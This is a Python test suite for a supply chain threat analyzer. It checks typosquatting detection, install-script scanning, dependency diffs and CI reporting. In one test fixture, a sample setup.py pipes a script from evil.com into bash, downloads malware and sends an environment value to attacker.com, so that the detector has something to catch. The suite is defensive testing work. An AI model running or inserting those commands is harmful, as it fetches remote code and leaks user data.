#!/usr/bin/env python3
"""
End-to-end tests for Threat Intelligence features (Supply Chain Analysis)
Tests the complete workflow of supply chain attack detection and threat assessment.
"""

import json
import tempfile
import time
from pathlib import Path
from typing import Any, Dict, List

import pytest

# Import the modules we're testing
import sys
sys.path.insert(0, str(Path(__file__).parent.parent.parent / "scripts"))

from supply_chain_analyzer import (
    DependencyChange,
    SupplyChainAnalyzer,
    ThreatAssessment,
    ThreatLevel,
)


class TestSupplyChainE2E:
    """End-to-end tests for supply chain threat intelligence"""

    def setup_method(self):
        """Setup test environment"""
        self.temp_dir = Path(tempfile.mkdtemp())
        self.analyzer = SupplyChainAnalyzer()
        self.test_repo_dir = self.temp_dir / "test_repo"
        self.test_repo_dir.mkdir(parents=True)

    def test_complete_supply_chain_workflow(self, tmp_path: Path):
        """
        Test complete supply chain analysis workflow:
        1. Detect dependency changes
        2. Analyze for threats (typosquatting, malicious scripts)
        3. Generate threat assessments
        4. Produce actionable recommendations
        """
        # Step 1: Create test dependency files with various threats
        package_json = self.test_repo_dir / "package.json"
        package_json.write_text(
            json.dumps(
                {
                    "name": "test-app",
                    "dependencies": {
                        "express": "^4.17.1",  # Legitimate
                        "reakt": "^1.0.0",  # Typosquatting (react)
                        "colouurs": "^1.0.0",  # Typosquatting (colors)
                        "malicious-pkg": "^1.0.0",  # Unknown package
                    },
                }
            )
        )

        requirements_txt = self.test_repo_dir / "requirements.txt"
        requirements_txt.write_text(
            """
django==3.2.0
reqeusts==2.28.0
python-dateutil==2.8.2
unknown-sketchy-package==1.0.0
"""
        )

        # Step 2: Analyze npm dependencies
        npm_findings = self.analyzer.analyze_manifest(
            str(package_json), ecosystem="npm"
        )

        assert len(npm_findings) > 0, "Should detect npm threats"

        # Verify typosquatting detection
        typosquatting_found = False
        for finding in npm_findings:
            if "typosquatting" in finding.threat_types:
                typosquatting_found = True
                assert finding.threat_level in [
                    ThreatLevel.HIGH,
                    ThreatLevel.CRITICAL,
                ], "Typosquatting should be high/critical severity"
                assert len(finding.similar_legitimate_packages) > 0, (
                    "Should suggest legitimate alternatives"
                )

        assert typosquatting_found, "Should detect typosquatting attempts"

        # Step 3: Analyze Python dependencies
        pypi_findings = self.analyzer.analyze_manifest(
            str(requirements_txt), ecosystem="pypi"
        )

        assert len(pypi_findings) > 0, "Should detect PyPI threats"

        # Step 4: Generate comprehensive report
        all_findings = npm_findings + pypi_findings
        report = self._generate_threat_report(all_findings)

        assert report["total_threats"] > 0
        assert "npm" in report["threats_by_ecosystem"]
        assert "pypi" in report["threats_by_ecosystem"]
        assert report["critical_count"] >= 0
        assert report["high_count"] >= 0

        # Verify recommendations are actionable
        for finding in all_findings:
            assert len(finding.recommendations) > 0, (
                "Each finding should have recommendations"
            )
            assert len(finding.evidence) > 0, "Each finding should have evidence"

    def test_typosquatting_detection(self):
        """Test detection of typosquatting attacks"""
        test_cases = [
            ("reakt", "npm", "react"),  # Missing 'c'
            ("lodahs", "npm", "lodash"),  # Wrong letter
            ("expres", "npm", "express"),  # Missing letter
            ("reqeusts", "pypi", "requests"),  # Swapped letters
            ("numpi", "pypi", "numpy"),  # Similar name
        ]

        for typosquat, ecosystem, legitimate in test_cases:
            is_typosquat, similar = self.analyzer._check_typosquatting(
                typosquat, ecosystem
            )
            assert is_typosquat, f"{typosquat} should be detected as typosquatting"
            assert legitimate in similar or any(
                legitimate in s for s in similar
            ), f"Should suggest {legitimate} as legitimate package"

    def test_malicious_script_detection(self, tmp_path: Path):
        """Test detection of malicious install scripts"""
        # Create package with suspicious install script
        malicious_package = tmp_path / "malicious-package"
        malicious_package.mkdir()

        # Suspicious setup.py with network calls
        setup_py = malicious_package / "setup.py"
        setup_py.write_text(
            """
import os
import subprocess
import urllib.request

# Malicious behavior
os.system('curl https://evil.com/steal_data.sh | bash')
subprocess.call(['wget', 'https://malicious.com/malware'])
urllib.request.urlopen('https://attacker.com/exfiltrate?data=' + os.environ['HOME'])
"""
        )

        # Analyze the script
        threats = self.analyzer._analyze_install_script(str(setup_py))

        assert len(threats) > 0, "Should detect malicious behavior"
        assert any("network" in t.lower() for t in threats), (
            "Should detect network calls"
        )
        assert any("command" in t.lower() or "execution" in t.lower() for t in threats), (
            "Should detect command execution"
        )

    def test_dependency_change_detection(self, tmp_path: Path):
        """Test detection of dependency changes in git"""
        # This would require git setup, so we'll test the parsing logic
        old_packages = {"express": "4.17.0", "lodash": "4.17.20"}
        new_packages = {
            "express": "4.17.1",  # Upgraded
            "lodash": "4.17.20",  # Unchanged
            "axios": "0.21.1",  # Added
        }

        changes = self.analyzer._compare_dependencies(
            old_packages, new_packages, "npm"
        )

        assert len(changes) == 2, "Should detect 2 changes (1 upgrade, 1 addition)"

        # Find the upgrade
        upgrades = [c for c in changes if c.change_type == "upgraded"]
        assert len(upgrades) == 1
        assert upgrades[0].package_name == "express"
        assert upgrades[0].old_version == "4.17.0"
        assert upgrades[0].new_version == "4.17.1"

        # Find the addition
        additions = [c for c in changes if c.change_type == "added"]
        assert len(additions) == 1
        assert additions[0].package_name == "axios"

    def test_openssf_scorecard_integration(self):
        """Test OpenSSF Scorecard integration for package security scoring"""
        # Test with real popular packages (should have high scores)
        safe_packages = ["express", "react", "lodash"]

        for package in safe_packages:
            # Mock the scorecard check (real API calls would be slow)
            # In real implementation, this calls the OpenSSF Scorecard API
            score = self.analyzer._get_openssf_scorecard(package, "npm")

            # Popular packages should have high scores (>7.0) or None if API unavailable
            if score is not None:
                assert score >= 0.0, "Score should be non-negative"
                assert score <= 10.0, "Score should be max 10.0"

    def test_multiple_ecosystems_analysis(self, tmp_path: Path):
        """Test analyzing multiple package ecosystems simultaneously"""
        # Create multi-language project
        project_dir = tmp_path / "multi_lang_project"
        project_dir.mkdir()

        # npm
        (project_dir / "package.json").write_text(
            json.dumps({"dependencies": {"reakt": "1.0.0"}})
        )

        # Python
        (project_dir / "requirements.txt").write_text("reqeusts==2.28.0\n")

        # Go
        (project_dir / "go.mod").write_text(
            """
module example.com/project
go 1.19
require github.com/gin-gonik/gin v1.7.0
"""
        )

        # Analyze all ecosystems
        all_threats = self.analyzer.analyze_project(str(project_dir))

        assert len(all_threats) > 0, "Should detect threats across ecosystems"

        # Verify we detected threats in multiple ecosystems
        ecosystems = {t.ecosystem for t in all_threats}
        assert len(ecosystems) >= 2, "Should analyze at least 2 ecosystems"

    def test_legitimate_package_no_false_positives(self):
        """Test that legitimate popular packages are not flagged"""
        legitimate_packages = {
            "npm": ["react", "express", "lodash", "axios", "webpack"],
            "pypi": ["django", "requests", "flask", "numpy", "pandas"],
        }

        for ecosystem, packages in legitimate_packages.items():
            for package in packages:
                is_typosquat, _ = self.analyzer._check_typosquatting(
                    package, ecosystem
                )
                assert not is_typosquat, (
                    f"{package} should not be flagged as typosquatting"
                )

    def test_threat_assessment_prioritization(self):
        """Test that threats are properly prioritized by severity"""
        findings = [
            ThreatAssessment(
                package_name="critical-vuln",
                ecosystem="npm",
                threat_level=ThreatLevel.CRITICAL,
                threat_types=["malicious_script", "typosquatting"],
                evidence=["Network calls in setup.py", "Similar to 'critical-lib'"],
                recommendations=["Remove immediately"],
            ),
            ThreatAssessment(
                package_name="medium-vuln",
                ecosystem="npm",
                threat_level=ThreatLevel.MEDIUM,
                threat_types=["low_scorecard"],
                evidence=["OpenSSF score: 3.2"],
                recommendations=["Consider alternatives"],
            ),
            ThreatAssessment(
                package_name="low-vuln",
                ecosystem="npm",
                threat_level=ThreatLevel.LOW,
                threat_types=["info"],
                evidence=["No known issues"],
                recommendations=["Monitor for updates"],
            ),
        ]

        # Sort by severity
        sorted_findings = self.analyzer.prioritize_threats(findings)

        assert sorted_findings[0].threat_level == ThreatLevel.CRITICAL
        assert sorted_findings[-1].threat_level == ThreatLevel.LOW

    def test_performance_large_project(self, tmp_path: Path):
        """Test performance with large number of dependencies"""
        # Create large package.json
        large_deps = {f"package-{i}": f"^{i % 10}.0.0" for i in range(200)}
        package_json = tmp_path / "package.json"
        package_json.write_text(
            json.dumps({"dependencies": large_deps})
        )

        start = time.time()
        findings = self.analyzer.analyze_manifest(str(package_json), ecosystem="npm")
        duration = time.time() - start

        # Should complete in reasonable time (< 30 seconds for 200 packages)
        assert duration < 30, f"Analysis took too long: {duration}s"
        assert isinstance(findings, list), "Should return list of findings"

    def test_error_handling_invalid_manifest(self):
        """Test error handling with invalid manifest files"""
        # Invalid JSON
        invalid_json = self.test_repo_dir / "invalid.json"
        invalid_json.write_text("{invalid json content")

        # Should not crash
        try:
            findings = self.analyzer.analyze_manifest(
                str(invalid_json), ecosystem="npm"
            )
            assert isinstance(findings, list), "Should return empty list on error"
        except Exception as e:
            # Should handle gracefully
            assert "parse" in str(e).lower() or "invalid" in str(e).lower()

    def test_report_generation(self):
        """Test generation of comprehensive threat report"""
        findings = [
            ThreatAssessment(
                package_name="evil-pkg",
                ecosystem="npm",
                threat_level=ThreatLevel.CRITICAL,
                threat_types=["malicious_script"],
                evidence=["Network calls"],
                recommendations=["Remove"],
            ),
            ThreatAssessment(
                package_name="typo-pkg",
                ecosystem="pypi",
                threat_level=ThreatLevel.HIGH,
                threat_types=["typosquatting"],
                evidence=["Similar to requests"],
                recommendations=["Use requests"],
                similar_legitimate_packages=["requests"],
            ),
        ]

        report = self._generate_threat_report(findings)

        assert "total_threats" in report
        assert report["total_threats"] == 2
        assert "critical_count" in report
        assert report["critical_count"] == 1
        assert "high_count" in report
        assert report["high_count"] == 1
        assert "threats_by_ecosystem" in report
        assert len(report["threats_by_ecosystem"]) == 2

    def test_ci_integration_workflow(self, tmp_path: Path):
        """Test workflow suitable for CI/CD integration"""
        # Simulate CI environment
        repo_dir = tmp_path / "ci_repo"
        repo_dir.mkdir()

        # Add dependencies
        (repo_dir / "package.json").write_text(
            json.dumps({"dependencies": {"axios": "^0.21.1", "reakt": "^1.0.0"}})
        )

        # Run analysis
        findings = self.analyzer.analyze_project(str(repo_dir))

        # Generate exit code based on severity
        exit_code = self._calculate_ci_exit_code(findings)

        # Should fail CI if critical/high threats found
        assert exit_code != 0, "Should fail CI when threats detected"

        # Generate CI-friendly output
        ci_report = self._generate_ci_report(findings)
        assert "summary" in ci_report
        assert "action_required" in ci_report

    # Helper methods

    def _generate_threat_report(self, findings: List[ThreatAssessment]) -> Dict[str, Any]:
        """Generate comprehensive threat report"""
        report = {
            "total_threats": len(findings),
            "critical_count": sum(
                1 for f in findings if f.threat_level == ThreatLevel.CRITICAL
            ),
            "high_count": sum(
                1 for f in findings if f.threat_level == ThreatLevel.HIGH
            ),
            "medium_count": sum(
                1 for f in findings if f.threat_level == ThreatLevel.MEDIUM
            ),
            "low_count": sum(
                1 for f in findings if f.threat_level == ThreatLevel.LOW
            ),
            "threats_by_ecosystem": {},
        }

        for finding in findings:
            if finding.ecosystem not in report["threats_by_ecosystem"]:
                report["threats_by_ecosystem"][finding.ecosystem] = []
            report["threats_by_ecosystem"][finding.ecosystem].append(
                finding.to_dict()
            )

        return report

    def _calculate_ci_exit_code(self, findings: List[ThreatAssessment]) -> int:
        """Calculate CI exit code based on threat severity"""
        if any(f.threat_level == ThreatLevel.CRITICAL for f in findings):
            return 2  # Critical threats
        if any(f.threat_level == ThreatLevel.HIGH for f in findings):
            return 1  # High threats
        return 0  # No blocking threats

    def _generate_ci_report(self, findings: List[ThreatAssessment]) -> Dict[str, Any]:
        """Generate CI-friendly report"""
        critical = [f for f in findings if f.threat_level == ThreatLevel.CRITICAL]
        high = [f for f in findings if f.threat_level == ThreatLevel.HIGH]

        return {
            "summary": f"Found {len(findings)} threats ({len(critical)} critical, {len(high)} high)",
            "action_required": len(critical) > 0 or len(high) > 0,
            "blocking_threats": [f.to_dict() for f in critical + high],
        }


class TestThreatIntelIntegration:
    """Test integration with other Argus components"""

    def test_integration_with_normalizer(self):
        """Test that findings can be normalized to UnifiedFinding format"""
        analyzer = SupplyChainAnalyzer()

        finding = ThreatAssessment(
            package_name="evil-pkg",
            ecosystem="npm",
            threat_level=ThreatLevel.CRITICAL,
            threat_types=["malicious_script"],
            evidence=["Network calls in setup script"],
            recommendations=["Remove package immediately"],
        )

        # Convert to UnifiedFinding format
        unified = {
            "category": "supply-chain",
            "severity": finding.threat_level.value,
            "title": f"Supply Chain Threat: {finding.package_name}",
            "description": ", ".join(finding.evidence),
            "file": "package.json",
            "recommendation": ", ".join(finding.recommendations),
            "cwe": "CWE-829",  # Inclusion of Functionality from Untrusted Control Sphere
            "owasp": "A06:2021 - Vulnerable and Outdated Components",
        }

        assert unified["category"] == "supply-chain"
        assert unified["severity"] == "critical"
        assert "evil-pkg" in unified["title"]

    def test_integration_with_ai_triage(self):
        """Test integration with AI triage system"""
        # Supply chain findings should have high confidence
        # and be prioritized for AI review
        finding = ThreatAssessment(
            package_name="suspicious-pkg",
            ecosystem="npm",
            threat_level=ThreatLevel.HIGH,
            threat_types=["typosquatting", "low_scorecard"],
            evidence=["Similar to 'express'", "OpenSSF score: 2.1"],
            recommendations=["Use express instead"],
            similar_legitimate_packages=["express"],
        )

        # AI triage should consider:
        # 1. Multiple threat types = higher confidence
        # 2. Suggested alternatives = actionable
        # 3. OpenSSF score = objective evidence
        ai_context = {
            "threat_count": len(finding.threat_types),
            "has_alternatives": len(finding.similar_legitimate_packages) > 0,
            "has_objective_evidence": finding.scorecard_score is not None
            or any("score" in e.lower() for e in finding.evidence),
        }

        assert ai_context["threat_count"] >= 2, "Multiple threat types increase confidence"
        assert ai_context["has_alternatives"], "Should provide legitimate alternatives"


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
